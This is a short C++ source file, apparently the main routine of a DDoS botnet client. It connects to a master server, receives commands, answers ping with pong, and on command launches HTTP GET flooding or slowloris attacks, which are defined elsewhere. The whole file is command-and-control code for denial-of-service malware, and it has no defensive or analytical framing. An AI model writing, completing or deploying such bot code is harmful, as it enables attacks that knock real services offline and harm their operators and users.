#include "ddosbot.h"

int main() {

	create_socket();

	if (connect(csock, (SOCKADDR*)&master_addr, sizeof(master_addr)) == SOCKET_ERROR) {
		cout << "Not Connect with server \n";
		system("pause");
		return 1;
	}

	if (recv(csock, command, (int)strlen(command), 0) == SOCKET_ERROR) {      // command receive
		perror("receive error");
		closesocket(sock);
		WSACleanup();
		return -1;
	}

	if (!strcmp(command, "ping")) {         // ping
		if (send(csock, "pong", 4, 0) == SOCKET_ERROR) {
			perror("send fail");
			closesocket(csock);
			WSACleanup();
			return -1;
		}
	}
	else if (!strcmp(command, "1")) {         // attack - basic http get flooding
		getflooding_attack();
	}
	else if (!strcmp(command, "2")) {
		slowloris_attack();
	}
	else if (!strcmp(command, "shut")) {         // shut 
		closesocket(csock);
		WSACleanup();
		return 1;
	}
	else {
		cout << "wrong command\n";
	}

	Sleep(1000);

	closesocket(csock);
	closesocket(sock);
	WSACleanup();
	system("pause");

	return 0;
}
